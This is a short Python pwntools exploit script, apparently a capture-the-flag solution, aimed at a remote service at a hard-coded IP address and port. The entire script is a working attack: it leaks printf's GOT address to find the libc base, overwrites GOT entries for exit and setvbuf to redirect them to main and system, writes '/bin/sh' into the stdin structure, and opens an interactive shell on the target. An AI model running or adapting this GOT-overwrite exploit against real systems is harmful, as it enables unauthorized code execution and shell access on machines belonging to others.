from pwn import *

###Addr
printf_got = 0x404020
exit_got = 0x404038
setvbuf_got = 0x404028
main = 0x4011ee
printf_offset = 0x62830
system_offset = 0x52fd0
stdin_struct_offset = 0x1e4a00

###Exploit
r = remote('140.112.31.97',30103)

r.sendlineafter('address : ',str(printf_got))
printf_addr = int(r.recvline(),16)
libc_base = printf_addr-printf_offset
print(hex(libc_base))

r.sendlineafter('address : ',str(exit_got))
r.sendlineafter('value : ',str(main))

r.sendlineafter('address : ',str(printf_got))
r.sendlineafter('address : ',str(setvbuf_got))
r.sendlineafter('value : ',str(libc_base+system_offset))

r.sendlineafter('address : ',str(printf_got))
r.sendlineafter('address : ',str(libc_base+stdin_struct_offset))
r.sendlineafter('value : ',str(u64(b'/bin/sh\x00')))

r.interactive()
